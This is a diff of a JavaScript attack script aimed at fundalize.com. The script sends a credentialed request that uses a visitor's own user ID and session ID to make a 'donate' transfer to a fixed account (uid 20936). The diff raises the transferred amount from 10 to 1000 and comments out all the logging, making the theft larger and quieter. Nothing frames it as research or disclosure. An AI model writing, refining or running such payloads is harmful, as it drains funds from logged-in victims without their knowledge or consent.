@@ -11,7 +11,7 @@ xhttp2.onreadystatechange=(e)=>{
 		step2();
 	}
 	else{
-		console.log('GET failed');
+		//console.log('GET failed');
 	}
 }
 xhttp2.send('');
@@ -28,9 +28,9 @@ function step2(){
 	xhttp.open('POST', 'http://www.fundalize.com/includes/ajax_useractions.php', true);
 	xhttp.withCredentials = true;
 	var cookies = document.cookie;
-	var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
-	console.log('User ID: ' + user_id);
-	console.log('SID: ' + SID);
+	var params = 'uid=20936&pid='+user_id+'&amount=1000&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
+	//console.log('User ID: ' + user_id);
+	//console.log('SID: ' + SID);
 	
 	
 	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
@@ -41,10 +41,10 @@ function step2(){
 	
 	xhttp.onreadystatechange=(e)=>{
 		if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
-			console.log('done');
+			//console.log('done');
 		}
 		else{
-			console.log('fail');
+			//console.log('fail');
 		}
 	}
 }
